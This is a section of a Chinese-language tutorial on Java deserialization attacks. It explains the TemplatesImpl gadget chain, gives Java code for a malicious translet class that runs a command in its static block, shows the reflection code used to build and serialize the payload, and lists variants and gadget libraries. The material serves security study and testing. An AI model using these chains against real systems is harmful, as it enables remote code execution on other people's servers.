## 五、TemplatesImpl 与其他核心 Gadget 深度

### 5.1 TemplatesImpl 原理
`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` 是大量链的"终点执行器"：
```
TemplatesImpl.newTransformer() → getTransletInstance() → defineTransletClasses()
→ ClassLoader.defineClass(_bytecodes[i]) 加载攻击者字节码 → 实例化触发 <clinit>/构造器 → RCE
```
关键可控字段（均需反射写入）：
- `_bytecodes`：恶意类字节码数组（Java 字节码，可经 ASM/javac 生成）
- `_name`：非空即可（如 `"a.b"`）
- `_tfactory`：`TransformerFactoryImpl` 实例（序列化时需 `_tfactory` 非空）
- `_outputProperties`/`_version`：触发 `newTransformer()` 的入口

### 5.2 手动构造 TemplatesImpl 变体
```java
// 恶意类（继承 AbstractTranslet，静态块/构造器执行命令）
public class Evil extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet {
    static { try { Runtime.getRuntime().exec("id"); } catch (Exception e) {} }
    public void transform(...) {} public void transform(...) {}
}
```
```java
// 反射构造 TemplatesImpl 并序列化（ysoserial 内部即此逻辑）
TemplatesImpl templates = new TemplatesImpl();
Field f = TemplatesImpl.class.getDeclaredField("_bytecodes");
f.setAccessible(true);
f.set(templates, new byte[][]{evilClassBytes});
// 依次设置 _name、_tfactory，序列化输出
```
**变体**：
- **BCEL 变体**（`com.sun.org.apache.bcel.internal.util.ClassLoader`）：JDK < 8u251 可用，`$$BCEL$$` 编码字节码，配合 `BasicDataSource`/`UnpooledDataSource` 做**不出网利用**
- **JNDI 变体**：`TemplatesImpl` 内部执行 JNDI lookup（如配合 `JdbcRowSetImpl` 终点）
- **回显变体**：恶意类内嵌内存马/命令回显逻辑（见第十四章）

### 5.3 其他高频 Gadget 库速查
```
- CommonsBeanutils (CB1/CB1.92)：BeanComparator + TemplatesImpl，仅需 commons-beanutils（Shiro 常用）
- Spring1/Spring2：MethodInvokeTypeProvider / JdkDynamicAopProxy（Spring-core 环境）
- Groovy1：MethodClosure（groovy 环境）
- ROME：ObjectBean + TemplatesImpl（rome 依赖）
- Hibernate1/2：Getter/Collection（hibernate 环境）
- Jython1 / Mozilla Rhino1 / BeanShell1：脚本引擎类（对应脚本库环境）
- C3P0：WrapperConnectionPoolDataSource 二次反序列化（HexAsciiSerializedMap:）
- URLDNS：仅触发 DNS 解析，无 RCE，用于漏洞探测
- AspectJWeaver：写文件链（aspectjweaver 依赖）
- Clojure：clojure.lang 反射链
```

